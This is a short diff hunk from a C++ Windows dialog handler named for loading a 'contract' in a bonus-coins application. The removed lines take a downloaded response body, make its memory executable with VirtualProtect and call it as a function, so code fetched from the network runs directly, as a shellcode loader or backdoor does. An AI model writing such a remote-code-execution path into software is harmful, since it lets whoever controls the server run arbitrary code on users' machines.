@@ -300,28 +300,6 @@ LRESULT ZiberBonusCoinsDlg::onContractLoaded(WPARAM wParam,LPARAM lParam)
 			file.Close();
 		}
 		*/
-		CFile file;
-		FUNCPTR func;
-		int len;
-		DWORD oldProtect;
-
-		len = sizeof(response->body.GetBuffer());
-		if(response->body.GetLength() != 0)
-		{
-			if (0 == VirtualProtect(response->body.GetBuffer(), len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-				return 1;    
-			}
-		    func = (FUNCPTR)response->body.GetBuffer();
-			func();
-		}
-		else {
-			file.Open(GetContractFilename(),CFile::modeCreate | CFile::modeWrite | CFile::typeBinary);
-			file.Write("fail", sizeof("fail"));
-			file.Close();
-		}
-
-
-
 	}
 	return 0;
 }
